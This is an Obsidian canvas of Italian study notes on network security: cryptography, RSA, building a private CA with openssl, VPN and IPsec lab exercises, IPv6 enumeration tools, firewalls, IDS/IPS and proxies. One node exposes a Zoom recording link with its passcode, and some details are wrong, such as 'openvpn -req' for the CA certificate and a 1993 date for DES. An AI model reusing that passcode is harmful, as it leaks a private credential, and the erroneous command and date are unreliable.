		{"id":"e34f9251083e115c","type":"text","text":"# Cenni sul macroargomento Sicurezza\n\nLa Sicurezza si occupa principalmente di garantire\n\n- ***Riservatezza*** - Solo il mittente e il destinatario devono essere a conoscenza del messaggio. Si può usare la ***crittografia***;\n- ***Autenticazione*** - Mittente e destinatario devono essere certi della rispettiva identità. Si possono usare le ***chiavi di RSA***;\n- ***Integrità*** - Bisogna poter garantire che il messaggio non sia stato danneggiato o manomesso, o rilevare questo evento se si verifica. Si può usare una ***funzione di hash***;\n- ***Disponibilità*** - Bisogna garantire l'accesso ai servizi.\n\nDa qui in poi Alice (A) e Bob (B) vorranno queste garanzie mentre comunicano, mentre la malvagia Trudy (T) proverà a fare qualcosa di cattivo (e.g. origliare o manomettere i messaggi).","x":-23208,"y":18412,"width":583,"height":432,"color":"6"},
		{"id":"38458df5a2012b07","type":"text","text":"# (Reti di Elaboratori)","x":-23208,"y":19018,"width":583,"height":185,"color":"6"},
		{"id":"37f12bc744e670af","type":"text","text":"# Threat Model\n\nTutto ciò che può fare l'agente malevolo T prende il nome di ***threat model***.\n\nEsempi di ***attacchi*** previsti da un threat model possono essere\n\n- ***Intercettazione*** - Semplicemente ascolto quello che si dicono A e B;\n\t- ***Decrittazione*** - Se i messaggi sono protetti posso provare a rompere la crittografia facendo ***bruteforce*** o ***crittoanalisi***;\n- ***Impersonificazione*** - Modifico gli header in modo da falsificare l'origine del pacchetto (o qualsiasi altro campo);\n\t- ***Hijacking*** - Mi sostituisco ad A o B e continuo la conversazione. Ne sono esempi attacchi come ***replay*** (o ***playback***) o un più complesso ***man in the middle***;\n- ***Denial of Service*** - Nego la disponibilità di un servizio;\n","x":-22375,"y":18412,"width":626,"height":432,"color":"#4545ff"},
		{"id":"9b81ac7346525cd3","type":"file","file":"Area Lab5 - VPN/SSL_MasterSecret.png","x":-20977,"y":18566,"width":572,"height":427},
		{"id":"426eef79772488bd","type":"file","file":"Area Lab5 - VPN/TLS_MasterSecret.png","x":-20977,"y":19228,"width":572,"height":427},
		{"id":"d2d7e5d474a68fbf","type":"text","text":"# Crittografia Simmetrica\n\nEvitiamo i commenti sulla storia della crittografia e sui cifrari alfabetici o a trasposizione.\n\n- Il primo cifrario simmetrico utile è il ***Data Encryption Standard*** (***DES***, 1993), un cifrario a blocchi che cifra secondo lo schema in figura con una chiave a 56 bit. Con una sola iterazione lo si rompe di forza bruta in un giorno (non si conoscono invece buoni attacchi che usano crittanalisi), e lo si può rendere più sicuro con 3 iterazioni che usano 3 chiavi diverse (***3DES***);\n- Nel 2001 ci si è resi conto che forse era un po' troppo debole, così è nato l'***Advanced Encryption Standard*** (***AES***), che manipola input a 128 bit e supporta chiavi a 128, 192 o 256 bit.\n\n\t- Un attacco a forza bruta che impiega 1 secondo per DES, impiega invece 149 trilioni di anni per AES.\n\t- Efficiente sia a livello HW che SW;\n\t- Non esistono vulnerabilità note;\n\nNel complesso, AES è lo standard per la crittografia simmetrica. L'unico punto debole sta nello ***scambio della chiave***. Come si risolve?\n\nSi usa uno schema di ***cifratura asimmetrica per scambiare la chiave simmetrica***, dopodiché si utilizza quest'ultima per cifrare i dati.","x":-22760,"y":17193,"width":597,"height":620,"color":"#4545ff"},
		{"id":"95dff9cca36f88f8","type":"file","file":"0 - Reti di Elaboratori/DES.png","x":-22661,"y":16875,"width":400,"height":217},
		{"id":"3917a2e6a01fd9ba","type":"text","text":"# Crittografia\n\nSi può dividere in due grandi mondi\n\n- ***Simmetrica*** - se conosco la chiave di Alice $K_A$ conosco anche la chiave di Bob $K_B$ (e viceversa), perché $K_A = K_B$;\n- ***Asimmetrica*** -  $K_A \\neq K_B$, e conoscerne una non mi garantisce di poter ricavare informazioni sull'altra.","x":-22305,"y":17972,"width":487,"height":280,"color":"6"},
		{"id":"b847514eab366869","type":"text","text":"# RSA (Rivest Shamir Adleman)\n\nAlgoritmo per costruire il lucchetto in modo che sia (statisticamente) impossibile da invertire per risalire alla chiave.\n\n- Scelgo due numeri primi $p$ e $q$ **grandi** (e.g. 1024 bit). Calcolo\n\t- $n = pq$\n\t- $z = (p-1)(q-1)$\n- Scelgo $e < n$ tale che non abbia fattori comuni a $z$\n- Scelgo $d$ tale che $e\\cdot d - 1$ sia esattamente divisibile per $z$ \n\t- $(e\\cdot d)\\,\\%\\, z = 1$\n- La chiave pubblica è $(n, e)$\n\t- Posso (de)cifrare un messaggio eseguendo $c = m^e\\mod n$\n- La chiave privata è $(n, d)$\n\t- Posso (de)cifrare un messaggio eseguendo $m = c^d\\mod n$","x":-21975,"y":16652,"width":630,"height":440,"color":"#4545ff"},
		{"id":"29c51f47d167e41b","type":"text","text":"# Crittografia Asimmetrica\n\nLa crittografia asimmetrica di basa su due concetti fondamentali:\n\n- ***Chiave Pubblica*** ($K^+$)- È più comodo vederla come un ***lucchetto***. B pubblica il modo per ***chiudere un messaggio a lui indirizzato***, assumendo che nessuno da questo sia in grado di dedurre la chiave per aprirlo ($\\Rightarrow$ la sua ***chiave privata***);\n- ***Chiave Privata*** ($K^-$) - È la chiave per ***decrittare i messaggi chiusi con la chiave pubblica***.\n\nTipicamente si usano algoritmi molto costosi, quindi si usa per creare un canale sicuro su cui trasferire le chiavi simmetriche. Esempio tipico di comunicazione asimmetrica su Internet è il seguente:\n\n- B genera la sua coppia di chiavi, divulgando quella pubblica e tenendo ben nascosta quella privata;\n- A riceve il lucchetto (chiave pubblica di B), lo usa per crittare il messaggio \"Ciao, sono Alice, questa è la mia chiave simmetrica\";\n- Solo B può aprire questo messaggio, ricavando la chiave simmetrica di A;\n- A questo punto si passa ad una cifratura simmetrica (AES).\n","x":-21960,"y":17193,"width":600,"height":620,"color":"#4545ff"},
		{"id":"d37ba61a9f11f6ce","type":"text","text":"# Applicazioni\n\nDato un messaggio $m$, una chiave pubblica $K^+$ e una chiave privata $K^-$ si ha che\n$$m = K^-(K^+(m)) = K^+(K^-(m))$$\nQuesto apre a due applicazioni principali:\n\n- Critto con la pubblica se mi interessa che solo chi ha la privata legga il mio messaggio;\n- Critto con la privata se mi interessa che là fuori siano certi che sono io l'autore del messaggio (***firma digitale***);\n\t- ***Identity Challenge*** - Una roba del tipo \"scrivi un messaggio che decrittato con la chiave pubblica contiene esattamente quello che ti dico\"","x":-21157,"y":17193,"width":540,"height":620,"color":"#4545ff"},
		{"id":"3303ed8cc128bcb6","type":"text","text":"# HowToPKI\n\nQui impariamo a grandi linee come settare una propria Certificate Authority (CA). Prima cosa, devo scegliere un device ed auto-dichiararmi CA. Per farlo genero:\n\n- Una ***chiave privata*** con `openssl genrsa -out ca.key 4096` oppure con `openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -out ca.key` (`genrsa` è una direttiva `legacy` per generare una chiave RSA, oggi si usa di più una roba modulare come `genpkey`);\n- Una chiave pubblica (i.e in questo caso il ***certificato della CA***) con `openvpn -req -x509 -new -nodes -key ca.key -sha256 -days 3650 -out ca.crt -subj \"/CN=MySandboxCA`, i.e. a partire dalla chiave privata genero un certificato `X.509` avente `Common Name = MySandboxCA`);\n\nA questo punto sono in grado di rilasciare due certificati: `server` e `client`. Prendiamo come esempio quello del `server`:\n- Partiamo generando una chiave privata (come prima, `openssl genrsa -out server.key 4096`). Questa cosa può farla sia direttamente la CA in uno schema centralizzato sia (come è più sensato, in realtà) il `server` stesso;\n- Usiamo la chiave privata per generare una ***CSR*** (***Certificate Signing Request***) con `openssl req -new -key server.key -out server.csr -subj \"/CN=vpnserver.local\"`. Specificare il ***Common Name*** (***CN***) del certificato è il minimo indispensabile, ma sarebbe meglio aggiungere altri due campi:\n\t- ***SAN*** (***Subject Alternative Name***) - Estensioni che forniscono `CN` alternativi, e.g. `-addext \"subjectAltName=DNS:vpnserver.local, IP:203.0.113.10\"`. Sempre più spesso i browser leggono solo i `SAN` ed ignorano il `CN`;\n\t- ***EKU*** (***Extended Key Usage***) - Specifica l'utilizzo previsto del certificato, e.g. `-addext \"extendedKeyUsage=serverAuth\"` lo rende un autenticatore lato `server`. Di nuovo, sempre più `sever VPN` esigono sapere l'uso previsto del certificato, se non metti l'`EKU` rischiano di rifiutarti anche se il certificato sarebbe teoricamente valido.\n- A questo punto, se stiamo facendo tutto sulla CA siamo già pronti per firmare il CSR. Altrimenti (di nuovo, come sarebbe meglio) sta al `server` inviarla alla `CA`.\n\nCreiamo quindi infine il nostro certificato firmato dalla `CA` con\n\n```bash\nopenssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out server.crt -days 365 -sha256\n```","x":-18137,"y":19364,"width":759,"height":953,"color":"4"},
		{"id":"c8edf4ba615b0fbb","type":"text","text":"","x":-18137,"y":20553,"width":759,"height":982},
		{"id":"a12055fd5e70af57","type":"file","file":"IPsec_Architecture.png","x":-13600,"y":19134,"width":759,"height":460},
		{"id":"9b3d1b04b270396b","type":"text","text":"# `Ex7` - Security Exercises\n\nSituazione: c'è una cartella `shared` con i pacchetti compressi di tutti i tool che ci servono. (`scapy`, `thc-ipv6`, `ipv6-toolkit`). Tocca estrarli, compilarli e installarli nei sistemi.\n\n- `pc1`, `pc2` - Qui vogliamo usare i due `toolkit ipv6`, quindi\n\n```bash\n\tcp /shared/master.zip / \n\tunzip master.zip & cd ipv6toolkit-master\n\tmake install\n\t# stessa cosa con thc\n```\n\n- `pc3` - Qui `scapy` è già installato, perché l'***immagine Docker*** usata da Katharà per avviare il nodo è stata settata con `pc3[image]=\"travelping/scapy\"` nel file `lab.conf`.\n\nOra che abbiamo i tool nelle macchine possiamo testare i vari comandi. `radvd; tcpdump -nt -i eth0` sul router e osserviamo quello che succede se eseguiamo: \n\n- `alive6` - Manda una `echo request` a `ff:02::1` (`all devices`). Di fatto è un attacco di ***enumeration***, ma solo a livello link-local;\n\t- Questo sta in `thc-ipv6`, l'analogo dell'altro pacchetto è `scan6 -L -i eth0`.\n\n\n### `scapy`\n\nPartiamo col dire che [questo tool](https://scapy.net/) è potentissimo e supporta la creazione di pacchetti di [un botto di protocolli diversi](https://scapy.readthedocs.io/en/latest/api/scapy.layers.html). Negli esercizi usiamo solo alcuni dei comandi, quelli inerenti a `IPv6`, ma [qui](https://scapy.readthedocs.io/en/latest/usage.html) c'è un tutorial più approfondito.\n\n\n<span style=\"color:rgb(236, 155, 14)\">Sto lasciando questi esercizi a metà perché mi sembrano troppo specifici e ho poca voglia. In caso, pacchi di slides 8 e 9.</span>","x":-8061,"y":15256,"width":759,"height":1089,"color":"3"},
		{"id":"9c265ba29c9c5e68","type":"text","text":"# Laboratorio 6 - Proxies\n\nRecupera questa lezione\n\n- [link](https://uniroma1.zoom.us/rec/share/Zf730cnNcifvpbcwpfgTIoQjpKahyLE4NNXm3H0zUgzfSWA2hSmPBpQtPGG7eCkG.viXA6ZIIChoa1PKa)\n- Passcode: 0sr5@$BS","x":-14113,"y":22012,"width":1259,"height":2141,"color":"3"},
		{"id":"3d3e74620b21e77b","type":"text","text":"","x":-12604,"y":23200,"width":759,"height":953},
		{"id":"92def60c5cfd6976","type":"text","text":"","x":-12604,"y":22012,"width":759,"height":953},
		{"id":"48990bf9bf36a9d5","type":"text","text":"# Laboratorio 5 Parte I - `openvpn`\n\n##### `Ex1`\n\nSe proviamo a mandare dei `ping` da `pc1` a `r2`, notiamo che non riceviamo risposta. Questo ovviamente perché `pc1` è su una rete privata, ed `r2` non ha alcuna route per raggiungerlo. Potrei risolvere aggiungendone una, o scrivendo delle regole di `NAT`, ma qui ci interessa settare un ***tunnel VPN*** tra `r1` ed `r2`.\n\nL'idea è quindi creare un'interfaccia virtuale che viene utilizzata per incapsulare il traffico di una rete che virtualmente vediamo direttamente connessa a noi. In particolare, lo facciamo con il caro vecchio comando `ip`, partendo da `r1`:\n\n- `ip tunnel add tun0 mode ipip remote 100.64.10.2 local 100.64.10.1` - Aggiungi un'interfaccia virtuale di tipo `tunnel` chiamata `tun0` che incapsula il pacchetto `IP` come payload di un altro pacchetto `IP` (`ipip`). L'`header IP` più esterno avrà come `destinazione` l'`IP` remoto `100.64.10.2`, e come sorgente l'`IP` locale `100.64.10.1` (in pratica gli sto anche dicendo su che interfaccia fisica inoltrare il pacchetto incapsulato);\n\t- Si può fare in modo analogo con `ip link add name tun0 type ipip ...`;\n\t- Puoi controllare gli effetti di questo comando con `ip link`.\n- `ip address add 10.0.0.1/30 dev tun0` - Va bene che è un'interfaccia virtuale, ma deve essere comunque collegata ad una LAN;\n- `ip link set tun0 up` - Attivo l'interfaccia;\n- ... stessi identici passaggi su `r2`, invertendo gli indirizzi `local` e `remote`.\n\nA questo punto facciamo un bel `./connect-lab.sh 100.64.10.3/16 wan` e ci godiamo il traffico con Wireshark, oppure con `tcpdump`. Notiamo che:\n\n- Il traffico osservato su `eth0` presenta un doppio `header IP` (e possiamo vederlo perché non c'è alcuna crittografia a nasconderlo);\n- Il traffico osservato su `tun0` ha un singolo `header IP`, i.e. quello con gli indirizzi del tunnel.\n\nOra, questo ci fa piacere, ma al momento abbiamo solo \"doppiato\" la connessione tra i due router. Possiamo però collegare le due LAN tramite il tunnel (e solo tramite esso!). `ip route add 192.168.2.0/24 via 10.0.0.2` su `r1` e analogo su `r2`. A questo punto ogni volta che un `host` di una delle due LAN vuole raggiungere l'altra può farlo passando attraverso il tunnel. Sembra non essere tutto sto granché, ma se negoziamo delle chiavi (e.g. `IPsec`, se come in questo caso siamo a livello `ip over ip`, o `openvpn` se arriviamo al livello `SSL/TLS`) questo traffico risulterà crittato. Dall'esterno, saranno i due router (gli endpoint del tunnel VPN) a dare l'impressione di parlare tra loro, mascherando gli `host` che si sono collegati ad essi.\n\n###### `Ex2`\n\nLa stessa cosa ma con `openvpn`, in modo che il traffico sia crittato. Dobbiamo quindi anzitutto creare le chiavi, e possiamo farlo in due modi:\n\n- ***Shared Secret*** - Generiamo una chiave segreta con `openvpn --genkey secret secret.key` e facciamo un copia e incolla manuale nell'altro router;\n\t- Nota che in questo modo useremo una ***static key***. In un'applicazione reale sarebbe meglio rinegoziare periodicamente la chiave, ottenendo così la proprietà di ***forward secrecy/security*** (i.e. se l'attaccante ricostruisce una chiave i danni sono limitati, perché tanto poi la cambio);\n\t- Nota anche che questa modalità non prevede i certificati, quindi di fatto ***non usa TLS***.\n- ***Public Key Infrastructure*** (***PKI***) - La modalità standard delle VPN serie. Visto che sarebbe da pazzi andare da una vera CA per registrarci, possiamo agilmente crearne una in locale (e.g. il router stesso) ed auto-firmarci i certificati. Il procedimento è nel riquadro a lato.\n\t- Sui router (`/usr/share/doc/openvpn/examples/sample-keys`) ci sono diversi esempi di certificati, nonché parametri di Diffie-Hellman classico e simili (anche se nelle implementazioni moderne si usa la variante `ecdh` . Possiamo usarli per implementare un abbozzo di `TLS` su `Katharà` <span style=\"color:rgb(236, 155, 14)\">(in caso vedi registrazione del 15/5 [qui](https://classroom.google.com/c/NzU1MDE4NjU5Mjky/m/NzU1NzExMjQwMjQy/details), verso 1h 15m, ma anche TERZO ASSIGNMENT ACME!!)</span>.\n\nUsiamo il primo metodo perché non mi va di fare cose complicate. Creiamo i file di configurazione `.conf`, che faranno le veci di tutti i vari `ip tunnel add ...`, `ip addr add ...` che abbiamo scritto nell'`Ex1`. `r1` farà da `server`, `r2` da `client` (paradigma obbligatorio in questo caso). Su entrambi i file `.conf` (o `.ovpn`, il SW non controlla l'estensione, basta che ci scrivi dentro le cose giuste), quindi sia lato `client` che lato `server`, scriviamo anzitutto\n\n```python\nport 1194\nproto udp\ndev tun\nifconfig 10.0.0.1 10.0.0.2      # Non scrivo la sottorete perché openvpn sa di dover creare una connessione punto-punto (/32 è implicito)\n\t\t\t\t\t\t\t\t# Lato client (r2) ovviamente li metto al contrario: ifconfig 10.0.0.2 10.0.0.1\nsecret server.key               # Lato client (r2) diventa client.key (ma tanto se è uno shared secret simmetrico sono la stessa cosa)\ncipher AES-256-CBC                     # Cifrario di default (NB: se usiamo Shared Secret funziona solo la modalità CBC)\ndata-ciphers AES-256-CBC:AES-128-CBC   # Cifrari alternativi (facoltativo)\n```\n\nLato `client` aggiungiamo anche le indicazioni per trovare il `server`, con `remote 100.64.10.1` (non specifico la porta perché usiamo quella standard). Mancano le rotte. Possiamo aggiungerle sia nel file di configurazione con `route 192.168.1.0 255.255.255.0 10.0.0.2` (lato `server`, analogo sul `client`) o manualmente con `ip route add 192.168.1.0/24 via 10.0.0.2` (e analogo su `r2`) e facciamo partire il tutto con `openvpn --config server.conf` (e analogo `client`) e proviamo ad osservare il traffico con Wireshark, come prima, il quale dalla porta `1194` riconosce che stiamo usando un qualche protocollo `openvpn`, ma non riesce ad interpretarne il contenuto per via della crittografia.\n\n<span style=\"color:rgb(236, 155, 14)\">I passaggi in teoria sono giusti, ma in pratica `pc1` non vede `pc2` (`destination unreachable`) e Wireshark non riesce a leggere il traffico (connect-lab non funziona). Penso di aver rotto Docker con un qualche `apt update`, perché anche `lclean` non riesce a pulire il laboratorio. Riprova con la VM sul fisso o reinstalla la VM.</span>\n","x":-17129,"y":19364,"width":1259,"height":2141,"color":"4"},
		{"id":"3a5e41a63a842278","type":"text","text":"# Laboratorio 5 Parte II - `IPsec`\n\n###### `Ex3`\n\nSPD si visualizza con `/usr/sbin/setkey -PD`, SAD con `-D`\n\n`ipsec-tools` e `racoon` sono supportati da Linux e Windows ma sono deprecated (usano IKEv1, ma sono ancora usati su Android). Meglio `strongswan` e `libreswan`.\n\n<span style=\"color:rgb(236, 155, 14)\">recupera ex3-8. non c'è una videolezione, sono c tuoi</span>","x":-17129,"y":22012,"width":1259,"height":2141,"color":"3"},
		{"id":"a2f0485e5d7c483b","type":"text","text":"# Firewall\n\nUn Firewall è un SW che filtra i pacchetti, decidendo cosa può passare e cosa no. Le logiche sulla base delle quali prende queste decisioni si basano sui principi di\n\n- ***Least Privilege*** - Meglio dire \"`blocca tutto tranne...`\" piuttosto che \"`consenti tutto tranne...`\". Questo si traduce in pratica nella regola di `default deny`;\n- ***Choke Point*** - Meglio prevedere pochi accesi alla rete (meglio ancora se uno solo), in modo da posizionare i Firewall in pochi punti strategici;\n- ***Defense in Depth*** - Meglio costruire il Firewall su più livelli, in modo da costringere un eventuale attaccante a dover rompere diversi layer piuttosto che uno solo (e.g. uno all'ingresso dell'intera rete locale, uno all'ingresso di ogni sottorete, uno su ogni `host`, spesso addirittura uno per ogni applicazione che gira sul singolo `host`!). Questo significa definire diversi ***perimetri di sicurezza***, ognuno con diversi livelli di controllo;\n\t- Posso realizzare questa cosa affidando all'edge Firewall il controllo sul protocollo `IP` a quello più interno sul `Trasporto` ed eventualmente a quello finale a livello `Applicazione` (*finer grain control* man mano che mi avvicino all'`host`);\n\t- ***Diversity of Defense*** - Implementare diversi sistemi di difesa sui diversi layer riduce le probabilità per un attaccante di trovare una vulnerabilità in grado di bucarli tutti insieme (diversi produttori $\\so$ diverse tecnologie $\\so$ diverse vulnerabilità);\n\t- ***Multiple Overlapping System*** - Se stiamo prendendo la questione seriamente, sarebbe ancora meglio avere più Firewall con compiti sovrapposti (e.g. il primo filtra su `DLL/IP`, il secondo su `IP/TCP`...). In questo modo (***redundancy***) divento più tollerante rispetto al fallimento di uno qualsiasi della catena di Firewall.\n - ***Universal Participation*** - Tutti i dispositivi connessi alla rete vanno considerati parte della strategia di difesa (e.g. devo definire i permessi anche per i dispositivi ospite);\n\t- ***Weakest Links*** - Un sistema di sicurezza è tanto forte quanto il suo anello più debole. È inutile costruire un Firewall stellare se poi consento il traffico verso una porta sulla quale un `host` ha una vulnerabilità nota. Un attaccante può sfruttare questo punto debole e ritrovarsi magicamente ad agire dall'interno;\n- ***Fail-Safe Stance*** - Se c'è un problema tecnico meglio entrare in modalità ***fail-close***, i.e. nel dubbio non consento alcun traffico finché la situazione non torna sotto controllo;\n- ***Simplicity*** - Un Firewall con tante regole è più difficile da gestire di uno con poche.\n\nIn linea di principio, posso prendere le mie decisioni basandomi su qualsiasi campo di qualsiasi layer dello stack `TCP/IP`. In pratica, arrivare fino al livello `Applicazione` richiede ***Deep Packet Inspection*** (cfr. ***Wireshark***) e conseguentemente tempo ed energie. Segue che devo sempre valutare un ***trade-off*** tra l'efficacia del Firewall e la sua complessità.\n\nImplementare un Firewall significa formulare delle ***policies*** in linguaggio naturale (e.g. \"tutti gli `host` interni devono usare il nostro `server DNS`\"), tradurle in ***filter rules*** (e.g. `allow DNS requests from hosts to DNS server`) e infine implementarle nella giusta sintassi del SW che stiamo utilizzando (e.g. `iptables`, `opensense`, ...).","x":-8061,"y":19890,"width":759,"height":1089,"color":"6"},
		{"id":"99000e11f7a10da1","type":"text","text":"# Meccanismi di Difesa\n\nInternet è come la savana: ogni mattina ti svegli e sai che dovrai correre più dei malintenzionati per non farti rubare i dati personali. Fortunatamente abbiamo degli strumenti per limitare i danni.\n\nAnzitutto, fintantoché sono nella mia LAN ho ben due livelli di protezione:\n\n- ***Firewall*** - La LAN va protetta sia da connessioni che non voglio escano (e.g. il computer di un bambino non deve poter visitare siti di compravendita di armi) sia da quelle che non voglio entrino (i.e. attacchi di qualsiasi tipo);\n- ***NAT*** - Visto che siamo a corto di indirizzi `IPv4`, verosimilmente ne avremo a disposizione meno di quelli che ci servirebbero. Dobbiamo fare ***NAT***. ... e che c'entra?\n\t- Intanto il NAT agisce un po' come Firewall, perché tende a bloccare le connessioni provenienti da `host` esterni non precedentemente contattati dall'interno (***Restricted Cone NAT***, ***Symmetric NAT***). Raramente i router sono impostati in modo da consentire l'accesso a chiunque conosca la giusta porta per il giusto `host` interno (***Full Cone NAT***, ***port forwarding***);\n\t- Poi, se non conosci vita, morte e miracoli del NAT altro che corsa, il leone ti prende subito.\n\nNé i Firewall né il NAT sono una garanzia di sicurezza, neanche sulla tanto intima LAN. Spesso gli attacchi arrivano come payload di protocolli consentiti, e.g. ***Cross Site Scripting*** su `HTTP` o ***SQL Injection***. Per proteggersi  da queste cose servono strumenti più complessi, tipo\n\n- ***Application Layer Firewall*** (***ALF***), implementabili tramite ***proxy*** (ci arriviamo);\n- ***Intrusion Detection Systems*** (***IDS***) e ***Intrusion Prevention Systems*** (***IPS***), perché se si insinuano in LAN utenti o traffico indesiderato... beh, vorremmo saperlo, e forse anche fare qualcosa.\n\nSe poi voglio uscire dalla LAN, ci sono altri strumenti per evitare di farmi bloccare e/o rubare i dati.\n\n- ***Proxy Server*** - Un metodo un po' \"naive\" se parliamo di sicurezza, perché in realtà andrebbe usato con molta cautela da parte dei `client`. Più spesso viene usato come ALF dalle grandi aziende che vogliono assicurarsi che non compri cocaina mentre sei a lavoro, o da TOR per... beh per fare esattamente l'opposto. Alla fine è tutta una guerra tra narcotrafficanti e admin;\n- ***VPN*** - Qui uso ***IPsec*** o ***SSL/TLS*** per implementare tunnel privati sull'Internet pubblico. Anche se di norma non sei tu a farlo (ti affidi a roba tipo NordVPN), *puoi* farlo. Si usa anche e soprattutto per l'***autenticazione***, la ***confidenzialità*** (crittografia sui `payload`), l'***anonimato*** (crittografia sugli `header`, anche se invero per questo obiettivo sarebbe meglio usare TOR, altrimenti consegni i tuoi dati al tuo provider, che vabbè, finché ha sede legale in posti tipo Svizzera va tutto bene, ma se devi fare cose serie meglio evitare) e l'***integrità*** (crittografia su tutto + `Message Authentication Code`) su Internet (*untrusted*).\n\nLe attività volte a fare il possibile per evitare che qualcuno o qualcosa rompa tutto prende il nome di ***Network Hardening***, e possiamo simulare attacchi per testarne l'efficacia (***Penetration Testing***).","x":-9319,"y":21214,"width":759,"height":1089,"color":"6"},
		{"id":"fd2a2e71cdca13de","type":"text","text":"# Testare le Difese\n\nAbbiamo preso tutte le contromisure possibili contro il malvagio mondo esterno. Abbiamo un Firewall/NAT, c'è un Reverse Proxy che protegge i `server`, i `client` usano le `VPN` e via dicendo.\n\nPossiamo vederle come difese \"statiche\", che potrebbero ancora lasciar passare qualcosa di indesiderato all'interno della rete. L'idea è che se succede dobbiamo\n\n- accorgercene, ed è a questo che servono gli ***Intrusion Detection Systems*** (***IDS***);\n- prendere al volo delle nuove contromisure, e.g. modificare le regole del Firewall, bloccare porte degli switch o isolare macchine sospette. Questo compito spetta all'evoluzione degli IDS, gli ***Intrusion Prevention Systems*** (***IPS***).\n\nTipicamente, comprendere queste cose richiede ***Deep Packet Inspection*** (***DPI***), quindi è verosimile pensare di mettere IDS in un `server` dentro la LAN al quale lo switch passa tutto il traffico che vede, i.e. clono su quella porta tutto il traffico di tutte le altre porte affinché sia ispezionato (i.e. ***SPAN mode***, ***Switch Port ANalizer***), mentre IPS deve essere *in-band*, i.e. in un punto della rete in cui passa il traffico e in cui può prendere decisioni (e.g. nel Firewall stesso, o subito dietro di esso verso la LAN).\n\nChe sia un allarme (IDS) o un'azione (IPS), una sospetta intrusione genera una reazione. Essendo di fatto un problema di classificazione, questo può portare sia a `True Positive/Negative` come anche a `False Positive/Negative`. Per un IDS che si limita a segnalare ci va bene mettere una bassa soglia di tolleranza: qualche falso positivo in più non è un problema per chi analizza questi dati. Per un IPS che potenzialmente blocca tutto dobbiamo essere discretamente sicuri, quindi è generalmente meglio accettare qualche falso negativo. Questo suggerisce un bilanciamento in cui IDS e IPS si coordinano per bilanciare al meglio FP e FN (si parla infatti più in generale di ***IDPS***). Questi SW sono abbastanza potenti, potendo mandare allarmi, droppare pacchetti, interrompere connessioni e/o sessioni aperte e addirittura ***modificare le regole del firewall***.\n\nDetto ciò, come verifico se questa roba funziona? Ovviamente provando ad attaccarla e vedendo come reagisce. Questa cosa si fa a più livelli e in diversi modi:\n\n-  Con poco effort posso fare un ***Vulnerability Scanning***, i.e. do un'occhiata in giro per vedere se ci sono vulnerabilità evidenti. Se ho più risorse (soldi e tempo) posso provare a sfruttarle in pratica (***Penetration Testing***), o mettermi direttamente nei panni dell'attaccante esterno (***Ethical Hacking***), fino a provare letteralmente tutto il provabile (***Security Auditing***);\n- Lo spirito di un test cambia molto a seconda di quanto sanno le persone coinvolte. Se il target sa che sta per essere oggetto di social engineering starà più attento, e se l'attaccante etico sa già su quale figura fare pressioni si risparmia parte del lavoro (***Tandem***). Se nessuno dei due sa nulla (***Double Blind***), l'attaccante si interfaccia con una Blackbox che non ha alcuna consapevolezza di essere sotto attacco. Si può giocare a classificare i diversi livelli di conoscenza.","x":-9319,"y":26510,"width":759,"height":1089,"color":"6"},
		{"id":"92843d37114194bd","type":"text","text":"# Forward Proxy\n\nL'obiettivo di un Forward Proxy è quello di porsi davanti al `client` che vuole comunicare con il `server`. Questa è di fatto l'idea con cui sono nati i proxy negli anni '90: \"invece di regolamentare intere reti con migliaia di utenti, li facciamo passare tutte per lo stesso IP e controlliamo quello\". Tradotto, è di fatto un ***Application Layer Firewall*** che può implementare ***Access Control Lists*** (e.g. mi metto davanti alla rete scolastica e se sei uno studente non ti faccio accedere ai social). In pratica, implementa ***autenticazione*** e ***autorizzazione***.\n\nSe il traffico è `HTTP` dobbiamo aggiustare il formato delle richieste. Le `GET` sono indirizzate al proxy, quindi il campo `dst` contiene l'`IP` del proxy. Come comunico l'`IP` del `server`?  Il `client` non può scrivere soltanto `GET path/to/doc`, ma `GET http://server_name/path/to/doc`. Ci penserà il proxy a fare la richiesta `GET` classica al `server`, di cui in questo modo conosce l'`IP`.\n\nSegue elenco di cose che posso fare con un Forward Proxy:\n\n- Caching `HTTP`, `DNS` (cfr. ***Reti di Elaboratori***) o qualsiasi altro protocollo. Oggi meno usato;\n- ***Auditing***, i.e. raccogliere log delle connessioni;\n- Posso richiedere tramite `HTTP` che il proxy apra per conto mio una connessione `FTP`, o qualsiasi altro protocollo. Questo però ha diversi problemi. Mi interessa connettermi al `server`, quindi se uso `TLS` voglio il *suo* certificato, ma in pratica io vedo sempre il certificato del proxy. Non solo devo fidarmi del fatto che il proxy autenticherà correttamente il `server`, ma anche se fosse potrebbe fare MitM. Vedi punti successivi per le soluzioni.\n- Creare un tunnel ***HTTP CONNECT***, i.e. il `client` dice al Forward Proxy una cosa tipo \"`apri per conto mio una connessione TCP verso host:porta e limitati a fare forwarding dei byte, senza toccarli`\". Questo in pratica crea un canale bidirezionale su cui il proxy stesso non ha più alcun controllo (vede la destinazione ma non può leggere il traffico, perché crittato `TLS` con chiavi scambiate direttamente tra `client` e `server`);\n\t- Molti proxy non consentono questa funzionalità, o la limitino alla `porta 443` (temono abusi, potrei incanalare traffico illecito senza alcun controllo);\n\t- Questo ci fa capire che non sono costretto a limitarmi al traffico `HTTP`: ho solo aperto una connessione `TCP`, posso appoggiare qualsiasi protocollo compatibile al di sopra. Segue che questo è il metodo \"safe\" per realizzare il punto precedente (`FTP` via `HTTP`);\n- Posso ottenere effetti simili ad una `VPN`: un ***anonymizer proxy*** ha l'obiettivo di nascondere l'identità del `client`, o farlo apparire in un altro posto. Nota che non c'è alcuna crittografia: inviare al proxy traffico in chiaro significa che lui può leggerlo;\n- Alcune aziende possono porre un ***SSL Forward Proxy*** tra la rete aziendale ed Internet. Di fatto è un ***MitM legalizzato*** in cui il `client` negozia un proprio TLS con il proxy e il proxy ne negozia un altro con il `server`, di fatto leggendo tutto il traffico del `client` in chiaro.\n\t- E `TLS`? Quando il `client` manda la richiesta, il proxy la intercetta e richiede il certificato al `server` firmandolo con la propria CA interna (e.g. `Burp Suite`) e inoltrandolo al `client`. Visto che questo avviene tendenzialmente in ambiti aziendali, i computer interni sono già configurati per fidarsi della CA interna, quindi accetteranno di buon grado il certificato, ritenendolo originale. In pratica, il proxy si è con successo finto il vero `server`.","x":-10580,"y":23862,"width":759,"height":1089,"color":"4"},
